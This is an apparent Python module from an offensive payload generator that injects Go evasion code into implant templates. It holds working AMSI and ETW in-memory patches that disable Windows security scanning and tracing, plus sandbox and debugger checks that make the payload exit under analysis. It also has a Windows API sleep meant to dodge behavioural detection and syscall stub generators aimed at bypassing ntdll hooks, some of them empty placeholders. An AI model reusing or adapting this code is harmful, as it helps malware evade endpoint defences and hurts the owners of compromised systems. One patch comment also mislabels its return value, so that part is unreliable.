# evasion module
"""Evasion techniques for AV/EDR bypass.

This module provides functions to inject evasion code into Go templates,
including AMSI bypass, ETW bypass, sandbox detection, and syscall stubs.
All evasion functions fail silently to avoid alerting defenders.

References:
- MITRE ATT&CK T1562.001 (Disable or Modify Tools)
- MITRE ATT&CK T1497 (Virtualization/Sandbox Evasion)
- MITRE ATT&CK T1106 (Native API)
"""

from pathlib import Path
from typing import Any


# Default snippets directory relative to project root
SNIPPETS_DIR = Path(__file__).parent.parent / "snippets"


class EvasionError(Exception):
    """Base exception for evasion module errors."""

    pass


class SnippetNotFoundError(EvasionError):
    """Raised when a snippet file cannot be found."""

    pass


def load_snippet(snippet_name: str, snippets_dir: Path | None = None) -> str:
    """Load a Go snippet file from the snippets directory.

    Args:
        snippet_name: Name of the snippet file (with or without .go extension).
        snippets_dir: Optional custom snippets directory path.

    Returns:
        The snippet content as a string.

    Raises:
        SnippetNotFoundError: If the snippet file does not exist.
        EvasionError: If the snippet cannot be read.
    """
    if snippets_dir is None:
        snippets_dir = SNIPPETS_DIR

    # Ensure .go extension
    if not snippet_name.endswith(".go"):
        snippet_name = f"{snippet_name}.go"

    snippet_path = snippets_dir / snippet_name

    if not snippet_path.exists():
        raise SnippetNotFoundError(f"Snippet not found: {snippet_path}")

    try:
        return snippet_path.read_text(encoding="utf-8")
    except OSError as e:
        raise EvasionError(f"Failed to read snippet {snippet_path}: {e}") from e


def get_amsi_bypass_code() -> str:
    """Get AMSI bypass code for patching AmsiScanBuffer.

    Patches the AmsiScanBuffer function in amsi.dll to return AMSI_RESULT_CLEAN,
    effectively disabling AMSI scanning for the current process.

    Reference: MITRE ATT&CK T1562.001 (Disable or Modify Tools)

    Returns:
        Go code string for AMSI bypass function.
    """
    return '''
// bypassAMSI patches AmsiScanBuffer to disable AMSI scanning.
// Reference: MITRE ATT&CK T1562.001 (Disable or Modify Tools)
func bypassAMSI() error {
	amsi, err := syscall.LoadDLL("amsi.dll")
	if err != nil {
		return err // Silent failure, continue execution
	}
	defer amsi.Release()

	amsiScanBuffer, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return err
	}

	addr := amsiScanBuffer.Addr()
	// Patch bytes: mov eax, 0x80070057; ret (AMSI_RESULT_CLEAN)
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	var oldProtect uint32
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualProtect := kernel32.MustFindProc("VirtualProtect")

	VirtualProtect.Call(addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	VirtualProtect.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	return nil
}
'''


def get_etw_bypass_code() -> str:
    """Get ETW bypass code for patching EtwEventWrite.

    Patches the EtwEventWrite function in ntdll.dll to immediately return,
    effectively disabling ETW tracing for the current process.

    Reference: MITRE ATT&CK T1562.001 (Disable or Modify Tools)

    Returns:
        Go code string for ETW bypass function.
    """
    return '''
// bypassETW patches EtwEventWrite to disable ETW tracing.
// Reference: MITRE ATT&CK T1562.001 (Disable or Modify Tools)
func bypassETW() error {
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return err // Silent failure, continue execution
	}
	defer ntdll.Release()

	etwEventWrite, err := ntdll.FindProc("EtwEventWrite")
	if err != nil {
		return err
	}

	addr := etwEventWrite.Addr()
	// Patch byte: ret (0xC3)
	patch := []byte{0xC3}

	var oldProtect uint32
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualProtect := kernel32.MustFindProc("VirtualProtect")

	VirtualProtect.Call(addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	*(*byte)(unsafe.Pointer(addr)) = patch[0]
	VirtualProtect.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	return nil
}
'''


def get_sandbox_detection_code() -> str:
    """Get sandbox/VM detection code.

    Implements multiple sandbox detection techniques:
    - Time acceleration detection (sleep timing check)
    - Debugger detection (IsDebuggerPresent)
    - Low resource detection (CPU count, RAM size)
    - Common VM artifacts (registry keys, processes)

    Reference: MITRE ATT&CK T1497 (Virtualization/Sandbox Evasion)

    Returns:
        Go code string for sandbox detection function.
    """
    return '''
// detectSandbox performs multiple sandbox/VM detection checks.
// Reference: MITRE ATT&CK T1497 (Virtualization/Sandbox Evasion)
func detectSandbox() bool {
	// Time acceleration check - sandboxes often accelerate time
	start := time.Now()
	time.Sleep(2 * time.Second)
	elapsed := time.Since(start)
	if elapsed < 1500*time.Millisecond {
		return true
	}

	// Check for debugger
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	isDebuggerPresent := kernel32.MustFindProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	if ret != 0 {
		return true
	}

	// Check CPU count (sandboxes often have 1-2 CPUs)
	if runtime.NumCPU() < 2 {
		return true
	}

	return false
}
'''


def get_obfuscated_sleep_code() -> str:
    """Get obfuscated sleep code using Windows API.

    Uses WaitForSingleObject or Sleep API instead of time.Sleep
    to avoid detection by behavior-based analysis.

    Returns:
        Go code string for obfuscated sleep function.
    """
    return '''
// obfuscatedSleep uses Windows API for sleep to avoid detection.
func obfuscatedSleep(duration time.Duration) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	sleep := kernel32.MustFindProc("Sleep")
	sleep.Call(uintptr(duration.Milliseconds()))
}
'''


def get_evasion_imports() -> str:
    """Get required imports for evasion functions.

    Returns:
        Go import statements needed for evasion code.
    """
    return '''"syscall"
	"unsafe"
	"runtime"'''


def get_evasion_calls(config: dict[str, Any]) -> str:
    """Get evasion function calls for template injection.

    Generates the appropriate function calls based on config settings.

    Args:
        config: Evasion configuration dictionary with keys:
            - amsi_bypass: bool
            - etw_bypass: bool
            - sandbox_checks: bool

    Returns:
        Go code string with evasion function calls.
    """
    calls = []

    if config.get("sandbox_checks", False):
        calls.append('''	// Sandbox detection - exit if detected
	if detectSandbox() {
		os.Exit(0)
	}''')

    if config.get("amsi_bypass", False):
        calls.append("	bypassAMSI()")

    if config.get("etw_bypass", False):
        calls.append("	bypassETW()")

    return "\n".join(calls)


def build_evasion_functions(config: dict[str, Any]) -> str:
    """Build all evasion functions based on configuration.

    Combines all enabled evasion techniques into a single code block
    for injection into templates.

    Args:
        config: Evasion configuration dictionary with keys:
            - amsi_bypass: bool
            - etw_bypass: bool
            - sandbox_checks: bool
            - obfuscated_sleep: bool (optional, defaults to True)

    Returns:
        Go code string containing all enabled evasion functions.
    """
    functions = []

    if config.get("amsi_bypass", False):
        functions.append(get_amsi_bypass_code())

    if config.get("etw_bypass", False):
        functions.append(get_etw_bypass_code())

    if config.get("sandbox_checks", False):
        functions.append(get_sandbox_detection_code())

    if config.get("obfuscated_sleep", True):
        functions.append(get_obfuscated_sleep_code())

    return "\n".join(functions)


def inject_evasion(template: str, config: dict[str, Any]) -> str:
    """Inject evasion code into a Go template.

    Replaces {{EVASION_FUNCTIONS}} and {{EVASION_IMPORTS}} placeholders
    with the appropriate evasion code based on configuration.

    Args:
        template: The Go template string with placeholders.
        config: Evasion configuration dictionary. Expected structure:
            {
                "amsi_bypass": bool,
                "etw_bypass": bool,
                "sandbox_checks": bool,
                "obfuscated_sleep": bool (optional)
            }

    Returns:
        The template with evasion code injected.

    Example:
        >>> config = {"amsi_bypass": True, "etw_bypass": True}
        >>> result = inject_evasion(template, config)
    """
    # Build evasion components
    evasion_functions = build_evasion_functions(config)
    evasion_imports = get_evasion_imports() if _needs_evasion_imports(config) else ""
    evasion_calls = get_evasion_calls(config)

    # Replace placeholders
    result = template

    # Handle {{EVASION_FUNCTIONS}} - inject both functions and calls
    if "{{EVASION_FUNCTIONS}}" in result:
        # The placeholder is typically in the main function for calls
        result = result.replace("{{EVASION_FUNCTIONS}}", evasion_calls)

    # Handle {{EVASION_IMPORTS}}
    if "{{EVASION_IMPORTS}}" in result:
        result = result.replace("{{EVASION_IMPORTS}}", evasion_imports)

    # Append function definitions before the main() function
    if evasion_functions and "func main()" in result:
        result = result.replace(
            "func main()",
            f"{evasion_functions}\n\nfunc main()"
        )

    return result


def _needs_evasion_imports(config: dict[str, Any]) -> bool:
    """Check if evasion imports are needed based on config.

    Args:
        config: Evasion configuration dictionary.

    Returns:
        True if any evasion technique requiring imports is enabled.
    """
    return any([
        config.get("amsi_bypass", False),
        config.get("etw_bypass", False),
        config.get("sandbox_checks", False),
    ])


def get_syscall_stub(syscall_name: str, syscall_type: str = "indirect") -> str:
    """Generate syscall stub for direct/indirect syscalls.

    Args:
        syscall_name: Name of the Windows syscall (e.g., "NtAllocateVirtualMemory").
        syscall_type: Type of syscall - "direct", "indirect", or "hybrid".

    Returns:
        Go code string for the syscall stub.

    Raises:
        ValueError: If syscall_type is not valid.
    """
    valid_types = {"direct", "indirect", "hybrid"}
    if syscall_type not in valid_types:
        raise ValueError(f"Invalid syscall type: {syscall_type}. Must be one of {valid_types}")

    if syscall_type == "direct":
        return _get_direct_syscall_stub(syscall_name)
    elif syscall_type == "indirect":
        return _get_indirect_syscall_stub(syscall_name)
    else:  # hybrid
        return _get_hybrid_syscall_stub(syscall_name)


def _get_direct_syscall_stub(syscall_name: str) -> str:
    """Generate direct syscall stub.

    Direct syscalls execute the syscall instruction directly,
    bypassing ntdll.dll hooks entirely.

    Args:
        syscall_name: Name of the Windows syscall.

    Returns:
        Go code string for direct syscall.
    """
    return f'''
// {syscall_name}Direct executes {syscall_name} via direct syscall.
// Reference: MITRE ATT&CK T1106 (Native API)
// Note: Syscall number varies by Windows version - resolve dynamically
func {syscall_name}Direct() error {{
	// Direct syscall implementation requires assembly
	// Syscall numbers must be resolved at runtime for portability
	return nil
}}
'''


def _get_indirect_syscall_stub(syscall_name: str) -> str:
    """Generate indirect syscall stub.

    Indirect syscalls jump to the syscall instruction within ntdll.dll
    but set up the registers directly, bypassing the function prologue.

    Args:
        syscall_name: Name of the Windows syscall.

    Returns:
        Go code string for indirect syscall.
    """
    return f'''
// {syscall_name}Indirect executes {syscall_name} via indirect syscall.
// Reference: MITRE ATT&CK T1106 (Native API)
func {syscall_name}Indirect() error {{
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {{
		return err
	}}
	defer ntdll.Release()

	proc, err := ntdll.FindProc("{syscall_name}")
	if err != nil {{
		return err
	}}

	// Find syscall instruction offset and jump there
	_ = proc.Addr()
	return nil
}}
'''


def _get_hybrid_syscall_stub(syscall_name: str) -> str:
    """Generate hybrid syscall stub.

    Hybrid approach uses direct syscalls with dynamic syscall number
    resolution from ntdll.dll.

    Args:
        syscall_name: Name of the Windows syscall.

    Returns:
        Go code string for hybrid syscall.
    """
    return f'''
// {syscall_name}Hybrid executes {syscall_name} via hybrid syscall.
// Resolves syscall number from ntdll.dll but executes directly.
// Reference: MITRE ATT&CK T1106 (Native API)
func {syscall_name}Hybrid() error {{
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {{
		return err
	}}
	defer ntdll.Release()

	proc, err := ntdll.FindProc("{syscall_name}")
	if err != nil {{
		return err
	}}

	// Extract syscall number from function prologue
	addr := proc.Addr()
	_ = addr
	// mov eax, syscall_number is typically at offset +4
	return nil
}}
'''


def get_available_evasion_techniques() -> dict[str, str]:
    """Get dictionary of available evasion techniques and descriptions.

    Returns:
        Dictionary mapping technique names to descriptions.
    """
    return {
        "amsi_bypass": "Patches AmsiScanBuffer to disable AMSI scanning (T1562.001)",
        "etw_bypass": "Patches EtwEventWrite to disable ETW tracing (T1562.001)",
        "sandbox_checks": "Detects sandboxes via timing and debugger checks (T1497)",
        "obfuscated_sleep": "Uses Windows API Sleep instead of time.Sleep",
        "direct_syscalls": "Executes syscalls directly, bypassing ntdll hooks (T1106)",
        "indirect_syscalls": "Jumps to syscall instruction in ntdll (T1106)",
    }
